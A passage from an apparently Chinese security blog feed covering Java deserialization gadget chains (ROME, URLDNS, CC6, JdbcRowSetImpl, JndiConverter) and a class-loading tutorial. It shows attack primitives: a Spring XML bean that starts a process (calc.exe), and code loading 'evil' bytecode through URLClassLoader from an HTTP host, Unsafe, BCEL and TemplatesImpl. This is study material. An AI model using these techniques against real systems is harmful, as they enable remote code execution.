class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)getOutputProperties:<span class="hljs-number">507</span>, TemplatesImpl (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xalan</span><span class="hljs-selector-class">.internal</span><span class="hljs-selector-class">.xsltc</span>.trax)invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)invoke:<span class="hljs-number">497</span>, Method (java<span class="hljs-selector-class">.lang</span>.reflect) <span class="hljs-selector-attr">[2]</span>toString:<span class="hljs-number">137</span>, ToStringBean (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.syndication</span><span class="hljs-selector-class">.feed</span>.impl)toString:<span class="hljs-number">116</span>, ToStringBean (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.syndication</span><span class="hljs-selector-class">.feed</span>.impl)toString:<span class="hljs-number">120</span>, ObjectBean (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.syndication</span><span class="hljs-selector-class">.feed</span>.impl)beanHashCode:<span class="hljs-number">193</span>, EqualsBean (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.syndication</span><span class="hljs-selector-class">.feed</span>.impl)hashCode:<span class="hljs-number">110</span>, ObjectBean (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.syndication</span><span class="hljs-selector-class">.feed</span>.impl)hash:<span class="hljs-number">338</span>, HashMap (java.util)readObject:<span class="hljs-number">1397</span>, HashMap (java.util)</code></pre></div><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>HashMap.hash()–&gt;URL.hashCode()</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">getByName</span>:<span class="hljs-number">1076</span>, InetAddress (java.net)<span class="hljs-attribute">getHostAddress</span>:<span class="hljs-number">436</span>, URLStreamHandler (java.net)<span class="hljs-attribute">hashCode</span>:<span class="hljs-number">353</span>, URLStreamHandler (java.net)<span class="hljs-attribute">hashCode</span>:<span class="hljs-number">878</span>, URL (java.net)<span class="hljs-attribute">hash</span>:<span class="hljs-number">338</span>, HashMap (java.util)<span class="hljs-attribute">readObject</span>:<span class="hljs-number">1397</span>, HashMap (java.util)</code></pre></div><h1 id="toString方法入口点"><a href="#toString方法入口点" class="headerlink" title="toString方法入口点"></a>toString方法入口点</h1><p>com.rometools.rome.feed.impl.ToStringBean#toString(java.lang.String)</p><p>示例漏洞：CVE-2020-1948</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231214101909320.png"></p><p>com.alibaba.fastjson.JSON.toString()</p><h1 id="hashCode方法入口点"><a href="#hashCode方法入口点" class="headerlink" title="hashCode方法入口点"></a>hashCode方法入口点</h1><h2 id="URLDNS-1"><a href="#URLDNS-1" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>java.net.URL.hashCode()</p><h2 id="ROME-1"><a href="#ROME-1" class="headerlink" title="ROME"></a>ROME</h2><p>com.rometools.rome.feed.impl.ObjectBean.hashCode()</p><h2 id="CC6-1"><a href="#CC6-1" class="headerlink" title="CC6"></a>CC6</h2><p>org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</p><h2 id="EqualsBean"><a href="#EqualsBean" class="headerlink" title="EqualsBean"></a>EqualsBean</h2><p>com.rometools.rome.feed.impl.EqualsBean.hashCode()</p><h1 id="equals方法入口点"><a href="#equals方法入口点" class="headerlink" title="equals方法入口点"></a>equals方法入口点</h1><p>org.springframework.aop.target.HotSwappableTargetSource.equals()</p><p>com.sun.org.apache.xpath.internal.objects.XString.equals()</p><h1 id="存在危险setter-getter方法的类"><a href="#存在危险setter-getter方法的类" class="headerlink" title="存在危险setter&#x2F;getter方法的类"></a>存在危险setter&#x2F;getter方法的类</h1><h2 id="JndiConverter"><a href="#JndiConverter" class="headerlink" title="JndiConverter"></a>JndiConverter</h2><p>全类名</p><p>org.apache.xbean.propertyeditor.JndiConverter</p><p>依赖</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-reflect<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.15<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><h3 id="setAsText"><a href="#setAsText" class="headerlink" title="setAsText"></a>setAsText</h3><p>org.apache.xbean.propertyeditor.JndiConverter#toObjectImpl</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231213181256628.png"> </p><p>org.apache.xbean.propertyeditor.AbstractConverter#setAsText</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231213181150542.png"> </p><h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><p>全类名</p><p>com.sun.rowset.JdbcRowSetImpl</p><p>依赖</p><p>jdk内置</p><p>com.sun.rowset.JdbcRowSetImpl#connect</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231212161437135.png"> </p><h3 id="getDatabaseMetaData"><a href="#getDatabaseMetaData" class="headerlink" title="getDatabaseMetaData"></a>getDatabaseMetaData</h3><p>com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231212161529181.png"> </p><h3 id="setAutoCommit"><a href="#setAutoCommit" class="headerlink" title="setAutoCommit"></a>setAutoCommit</h3><p>com.sun.rowset.JdbcRowSetImpl#setAutoCommit</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231212161645365.png"> </p><h2 id="JSVGCanvas"><a href="#JSVGCanvas" class="headerlink" title="JSVGCanvas"></a>JSVGCanvas</h2><p>全类名</p><p>org.apache.batik.swing.JSVGCanvas</p><p>依赖</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xmlgraphics<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>batik-swing<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.16<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre></div><h3 id="setURI"><a href="#setURI" class="headerlink" title="setURI"></a>setURI</h3><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20231213182843785.png"> </p><h1 id="实例化对象过程中的利用链"><a href="#实例化对象过程中的利用链" class="headerlink" title="实例化对象过程中的利用链"></a>实例化对象过程中的利用链</h1><h2 id="ClassPathXmlApplicationContext"><a href="#ClassPathXmlApplicationContext" class="headerlink" title="ClassPathXmlApplicationContext"></a>ClassPathXmlApplicationContext</h2><p>全类名</p><p>org.springframework.context.support.ClassPathXmlApplicationContext</p><p>org.springframework.context.support.FileSystemXmlApplicationContext</p><p>依赖</p><p>xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>calc.exe<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>      <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>类加载</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Java%E5%AE%89%E5%85%A8/%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>什么是类加载？</p><div class="code-wrapper"><pre><code class="hljs">类加载是将Java类的字节码加载到Java虚拟机（JVM）中并进行解析、验证、准备和初始化的过程。字节码的来源可以是本地磁盘，网络位置等</code></pre></div><p>java为什么要实现类加载？</p><div class="code-wrapper"><pre><code class="hljs mipsasm">模块化和代码复用：类加载使得<span class="hljs-keyword">Java程序可以按需加载所需的类，而不是一次性将所有类加载到内存中。这种模块化的加载方式使得代码更可维护、更易于扩展，并且可以实现代码的复用。</span><span class="hljs-keyword"></span>动态扩展和插件化：类加载使得<span class="hljs-keyword">Java程序可以在运行时动态加载新的类，从而实现动态扩展功能。</span></code></pre></div><p>类加载的应用场景</p><div class="code-wrapper"><pre><code class="hljs">安全补丁</code></pre></div><h1 id="类加载基础"><a href="#类加载基础" class="headerlink" title="类加载基础"></a>类加载基础</h1><h2 id="类的生命周期"><a href="#类的生命周期" class="headerlink" title="类的生命周期"></a>类的生命周期</h2><div class="code-wrapper"><pre><code class="hljs livescript">.java--&gt; .<span class="hljs-keyword">class</span> --&gt; 加载 --&gt; 链接<span class="hljs-function"><span class="hljs-params">(验证、准备、解析)</span> --&gt;</span> 初始化 --&gt; 使用 --&gt;卸载</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/classload.png"></p><h2 id="类加载的过程"><a href="#类加载的过程" class="headerlink" title="类加载的过程"></a>类加载的过程</h2><p>加载</p><div class="code-wrapper"><pre><code class="hljs">将类的字节码加载到内存中</code></pre></div><p>链接</p><ul><li>验证</li><li>准备</li><li>解析</li></ul><p>初始化</p><div class="code-wrapper"><pre><code class="hljs">初始化阶段会按照一定的顺序执行静态变量的赋值、静态代码块中的代码以及执行静态方法。通常用于初始化类的静态成员变量或执行一些静态的初始化操作。当类首次被主动使用时，才会触发类的初始化操作。主动使用的场景包括创建类的实例、访问类的静态变量或静态方法，以及使用反射方式来操作类。</code></pre></div><h2 id="类加载器类型"><a href="#类加载器类型" class="headerlink" title="类加载器类型"></a>类加载器类型</h2><p>BootstrapClassLoader</p><div class="code-wrapper"><pre><code class="hljs gauss">负责加载java运行环境目录<span class="hljs-keyword">lib</span>目录下的jar包类文件，如D:\Program Files\Java\jdk1<span class="hljs-number">.8</span><span class="hljs-number">.0</span>_65\jre\<span class="hljs-keyword">lib</span></code></pre></div><p>ExtClassLoader</p><div class="code-wrapper"><pre><code class="hljs gauss">负责加载java运行环境<span class="hljs-keyword">lib</span>目录下的ext目录下的jar包类文件，如D:\Program Files\Java\jdk1<span class="hljs-number">.8</span><span class="hljs-number">.0</span>_65\jre\<span class="hljs-keyword">lib</span>\ext</code></pre></div><p>AppClassLoader</p><div class="code-wrapper"><pre><code class="hljs">负责加载用户创建的类</code></pre></div><p>自定义类加载器</p><div class="code-wrapper"><pre><code class="hljs">继承ClassLoader抽象类，重写findClass方法</code></pre></div><h2 id="类加载器继承关系"><a href="#类加载器继承关系" class="headerlink" title="类加载器继承关系"></a>类加载器继承关系</h2><div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java.lang.ClassLoader</span><span class="hljs-keyword"></span>↑<span class="hljs-keyword">java.security.SecureClassLoader</span><span class="hljs-keyword"></span>↑<span class="hljs-keyword">java.net.URLClassLoader</span><span class="hljs-keyword"></span>↑sun.misc.Launcher.AppClassLoader <span class="hljs-title">||</span> sun.misc.Launcher.<span class="hljs-keyword">ExtClassLoader</span></code></pre></div><h2 id="类加载相关方法"><a href="#类加载相关方法" class="headerlink" title="类加载相关方法"></a>类加载相关方法</h2><h3 id="loadClass"><a href="#loadClass" class="headerlink" title="loadClass"></a>loadClass</h3><p>java通过loadClass方法实现类加载，该方法有两个重载方法，一个参数指定类名，另一个参数指定是否需要解析</p><div class="code-wrapper"><pre><code class="hljs leaf">java.lang.ClassLoader<span class="hljs-punctuation">#</span><span class="hljs-keyword">loadClass</span><span class="hljs-params">(<span class="hljs-variable">java</span>.<span class="hljs-variable">lang</span>.<span class="hljs-variable">String</span>)</span>java.lang.ClassLoader<span class="hljs-punctuation">#</span><span class="hljs-keyword">loadClass</span><span class="hljs-params">(<span class="hljs-variable">java</span>.<span class="hljs-variable">lang</span>.<span class="hljs-variable">String</span>, <span class="hljs-variable">boolean</span>)</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916173655481.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916173724544.png"></p><h3 id="findClass"><a href="#findClass" class="headerlink" title="findClass"></a>findClass</h3><p>java.lang.ClassLoader#findClass</p><p>从URLClassPath中查找类存放的路径</p><h3 id="defineClass"><a href="#defineClass" class="headerlink" title="defineClass"></a>defineClass</h3><p>java.lang.ClassLoader#defineClass(java.lang.String, byte[], int, int)</p><p>将字节码转换为类对象</p><h1 id="类加载过程分析"><a href="#类加载过程分析" class="headerlink" title="类加载过程分析"></a>类加载过程分析</h1><p>此处以一个参数的loadClass方法示例分析</p><div class="code-wrapper"><pre><code class="hljs nsis">ClassLoader <span class="hljs-params">system</span>ClassLoader = ClassLoader.get<span class="hljs-params">System</span>ClassLoader()<span class="hljs-comment">;</span><span class="hljs-params">System</span>.out.println(<span class="hljs-params">system</span>ClassLoader)<span class="hljs-comment">;</span><span class="hljs-params">system</span>ClassLoader.loadClass(<span class="hljs-string">&quot;com.pacemrc.javasec.classload.Person&quot;</span>)<span class="hljs-comment">;</span></code></pre></div><p>在loadClass方法行下断点，调试运行，当前获取到的类加载器是<code>AppClassLoader</code></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916174324439.png"></p><p>进入loadClass方法，其调用两个参数的loadClass方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916174448629.png"></p><p>进入到Launcher类的loadClass方法，首先做一些类名和访问性的检查，然后调用父类的loadClass方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916174938862.png"></p><p>由于AppClassLoader的父类URLClassLoader和SecurityClassLoader没有loadClass方法，所以直接调用到顶级父类ClassLoader的loadClass方法，首先从已加载的类中判断类是否已加载</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916175352377.png"></p><p>当没有从已加载的类中找到该类，则使用parent对象的loadClass方法来加载类，该parent对象为<code>ExtClassLoader</code>类的实例</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916175622038.png"></p><p>跟进其loadClass方法，仍然调用的是ClassLoader类的loadClass方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916175820984.png"></p><p>同样的流程，先判断ExtClassLoader是否已经加载该类，当没有找到该类时，判断parent对象的值，当parent对象为null时，使用findBootstrapClassOrNull方法加载类，该方法使用的是BootstrapClassLoader类加载器</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916180342734.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916180414086.png"></p><p>当BootstrapClassLoader未找到类时</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916180705390.png"></p><p>继续往下，使用findClass方法加载类</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916180751451.png"></p><p>findClass方法中将类名替换为资源路径，然后在URLClassPath对象中查找该路径，第一次findClass未查询到返回null</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916181105984.png"></p><p>后续又进入到该方法（推测可能做一些权限的判断来查找文件），成功获取到类路径，再defineClass方法将class文件转换为类对象</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916181408267.png"></p><p>最后获取到该类</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916181615513.png"></p><p>继续往下，判断是否需要解析类，此处默认不需要解析，最后将类返回</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916181659782.png"></p><p>最后成功加载类</p><h1 id="类加载在安全方面的问题"><a href="#类加载在安全方面的问题" class="headerlink" title="类加载在安全方面的问题"></a>类加载在安全方面的问题</h1><h2 id="初始化过程"><a href="#初始化过程" class="headerlink" title="初始化过程"></a>初始化过程</h2><p>类加载在初始化阶段会执行静态代码块中的代码，当类首次被主动使用时，才会触发类的初始化操作。主动使用的场景包括创建类的实例、访问类的静态变量或静态方法，以及使用反射方式来操作类。</p><h3 id="创建实例对象时执行静态代码块"><a href="#创建实例对象时执行静态代码块" class="headerlink" title="创建实例对象时执行静态代码块"></a>创建实例对象时执行静态代码块</h3><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916225652651.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916230445189.png"></p><h3 id="反射操作时执行静态代码块"><a href="#反射操作时执行静态代码块" class="headerlink" title="反射操作时执行静态代码块"></a>反射操作时执行静态代码块</h3><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916233523663.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916233639907.png"></p><h2 id="类的使用过程"><a href="#类的使用过程" class="headerlink" title="类的使用过程"></a>类的使用过程</h2><h3 id="实例化过程中会执行构造代码块和构造方法中的代码"><a href="#实例化过程中会执行构造代码块和构造方法中的代码" class="headerlink" title="实例化过程中会执行构造代码块和构造方法中的代码"></a>实例化过程中会执行构造代码块和构造方法中的代码</h3><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916234355504.png"></p><h3 id="访问类的静态变量或静态方法时会执行静态代码块"><a href="#访问类的静态变量或静态方法时会执行静态代码块" class="headerlink" title="访问类的静态变量或静态方法时会执行静态代码块"></a>访问类的静态变量或静态方法时会执行静态代码块</h3><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916233922863.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916234216576.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230916234247147.png"></p><h1 id="类加载的方式"><a href="#类加载的方式" class="headerlink" title="类加载的方式"></a>类加载的方式</h1><h2 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class#forName"></a>Class#forName</h2><p>java.lang.Class#forName(java.lang.String)</p><p>java.lang.Class#forName(java.lang.String, boolean, java.lang.ClassLoader)</p><p><strong>Class.forName(String name)</strong> 默认进行类初始化操作，自动执行类中的静态代码块</p><h2 id="ClassLoader-loadClass"><a href="#ClassLoader-loadClass" class="headerlink" title="ClassLoader#loadClass"></a>ClassLoader#loadClass</h2><p>java.lang.ClassLoader#loadClass(java.lang.String)</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();Class &lt;? &gt; clz = classLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);clz.newInstance();</code></pre></div><h2 id="ClassLoader-findClass"><a href="#ClassLoader-findClass" class="headerlink" title="ClassLoader#findClass"></a>ClassLoader#findClass</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<span class="hljs-type">Method</span> <span class="hljs-variable">findClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;findClass&quot;</span>, String.class);findClass.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> (Class) findClass.invoke(classLoader, <span class="hljs-string">&quot;Calc&quot;</span>);calc.newInstance();</code></pre></div><h2 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<span class="hljs-type">Method</span> <span class="hljs-variable">defineClassMethod</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);defineClassMethod.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;src/main/resources/Evil_bytecodes/Calc.class&quot;</span>));<span class="hljs-type">Class</span> <span class="hljs-variable">calc</span> <span class="hljs-operator">=</span> (Class) defineClassMethod.invoke(classLoader, <span class="hljs-string">&quot;Calc&quot;</span>, bytes, <span class="hljs-number">0</span>, bytes.length);calc.newInstance();</code></pre></div><h2 id="URLClassLoader-loadClass"><a href="#URLClassLoader-loadClass" class="headerlink" title="URLClassLoader#loadClass"></a>URLClassLoader#loadClass</h2><p>URL支持的协议有file、http、jar</p><p>格式：</p><p>file:&#x2F;&#x2F;&#x2F;path</p><p><a href="http://ip/">http://ip/</a></p><p>jar:<a href="http://ip/!/">http://ip/!/</a></p><p>jar:file:&#x2F;&#x2F;&#x2F;path!&#x2F;</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">url1</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&lt;http://localhost:9999/&gt;&quot;</span>;<span class="hljs-type">String</span> <span class="hljs-variable">url2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;file:///&quot;</span>+System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>)+<span class="hljs-string">&quot;\\\\src\\\\main\\\\resources\\\\Evil_bytecodes\\\\&quot;</span>;<span class="hljs-type">String</span> <span class="hljs-variable">url3</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jar:&lt;http://localhost:9999/!/&gt;&quot;</span>;<span class="hljs-type">String</span> <span class="hljs-variable">url4</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jar:file:///&quot;</span>+System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>)+<span class="hljs-string">&quot;\\\\src\\\\main\\\\resources\\\\Evil_bytecodes\\\\!/&quot;</span>;URL[] urls = &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url1)&#125;;<span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(urls);Class&lt;?&gt; loadClass = urlClassLoader.loadClass(<span class="hljs-string">&quot;Calc&quot;</span>);loadClass.newInstance();</code></pre></div><h2 id="Unsafe-defineClass"><a href="#Unsafe-defineClass" class="headerlink" title="Unsafe#defineClass"></a>Unsafe#defineClass</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> Unsafe.class;<span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafe</span> <span class="hljs-operator">=</span> clz.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);theUnsafe.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafe.get(<span class="hljs-literal">null</span>);<span class="hljs-type">ClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();<span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;src/main/resources/Evil_bytecodes/Calc.class&quot;</span>));Class &lt;? &gt; calc = unsafe.defineClass(<span class="hljs-string">&quot;Calc&quot;</span>, bytes, <span class="hljs-number">0</span>, bytes.length, classLoader, <span class="hljs-literal">null</span>);calc.newInstance();</code></pre></div><h2 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-type">JavaClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> Repository.lookupClass(ClassLoad.EvilClass.Calc.class);<span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span> Utility.encode(cls.getBytes(), <span class="hljs-literal">true</span>);<span class="hljs-type">String</span> <span class="hljs-variable">bcel_code</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$$BCEL$$&quot;</span> + code;<span class="hljs-keyword">new</span> <span class="hljs-title class_">com</span>.sun.org.apache.bcel.internal.util.ClassLoader().loadClass(bcel_code).newInstance();System.out.println(code);System.out.println(bcel_code);</code></pre></div><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);        field.setAccessible(<span class="hljs-literal">true</span>);        field.set(obj, value);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testTemplatesImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;        <span class="hljs-type">byte</span>[] code = Base64.decodeBase64(<span 